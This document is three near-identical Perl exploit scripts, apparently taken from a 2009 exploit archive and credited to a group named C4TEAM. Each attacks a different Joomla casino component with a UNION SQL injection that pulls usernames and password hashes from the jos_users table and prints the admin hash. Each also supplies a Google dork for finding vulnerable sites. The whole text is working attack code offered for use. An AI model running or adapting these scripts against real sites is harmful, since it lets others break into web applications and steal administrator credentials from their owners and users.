#!/usr/bin/perl -w


########################################
#[~] Author : ByALBAYX
#[~] Site   : WWW.C4TEAM.ORG
########################################
#[!] Modul  : com_casino_blackjack
#[!] Dork   : inurl:"com_casino_blackjack"
########################################


system("color FF0000");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t                      |  C4TEAM  |                           \n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t   |Joomla Module com_casino_blackjack SQL Inj Vuln|         \n\n";
print "\t\t                      | ByALBAYX |                           \n\n";
print "\t\t-------------------------------------------------------------\n\n";

use LWP::UserAgent;

print "\nSite/Path:[http://wwww.c4team.org/Path/]: ";
chomp(my $target=<STDIN>);

$column_name="concat(username,0x3a,password)";
$table_name="jos_users";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $target . "/index.php?option=com_casino_blackjack&game_mode=Blackjack&shuffle=1&Itemid=1+AND+1=2+UNION+SELECT+".$column_name.",1,2+from/**/".$table_name."--";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Exploit Calisti #\n\n";
}
else{print "\n[-] Hash BulunamadÃ½...\n";
}

###################################################################

#!/usr/bin/perl -w


########################################
#[~] Author : ByALBAYX
#[~] Site   : WWW.C4TEAM.ORG
########################################
#[!] Modul  : com_casinobase
#[!] Dork   : inurl:"com_casinobase"
########################################


system("color FF0000");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t                      |  C4TEAM  |                           \n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t       |Joomla Module Com_Casinobas SQL Inj Vuln|            \n\n";
print "\t\t                      | ByALBAYX |                           \n\n";
print "\t\t-------------------------------------------------------------\n\n";

use LWP::UserAgent;

print "\nSite/Path:[http://wwww.c4team.org/Path/]: ";
chomp(my $target=<STDIN>);

$column_name="concat(username,0x3a,password)";
$table_name="jos_users";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $target . "/index.php?option=com_casinobase&Itemid=1+AND+1=2+UNION+SELECT+".$column_name.",1,2+from/**/".$table_name."--";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Exploit Calisti #\n\n";
}
else{print "\n[-] Hash BulunamadÃ½...\n";
}

###################################################################

#!/usr/bin/perl -w


########################################
#[~] Author : ByALBAYX
#[~] Site   : WWW.C4TEAM.ORG
########################################
#[!] Modul  : com_casino_videopoker
#[!] Dork   : inurl:"com_casino_videopoker"
########################################


system("color FF0000");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t                      |  C4TEAM  |                           \n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t    |Joomla Module com_casino_videopoker SQL Inj Vuln|       \n\n";
print "\t\t                      | ByALBAYX |                           \n\n";
print "\t\t-------------------------------------------------------------\n\n";

use LWP::UserAgent;

print "\nSite/Path:[http://wwww.c4team.org/Path/]: ";
chomp(my $target=<STDIN>);

$column_name="concat(username,0x3a,password)";
$table_name="jos_users";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $target . "/index.php?option=com_casino_videopoker&Itemid=1+AND+1=2+UNION+SELECT+".$column_name.",1,2+from/**/".$table_name."--";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Exploit Calisti #\n\n";
}
else{print "\n[-] Hash BulunamadÃ½...\n";
}

# milw0rm.com [2009-05-20]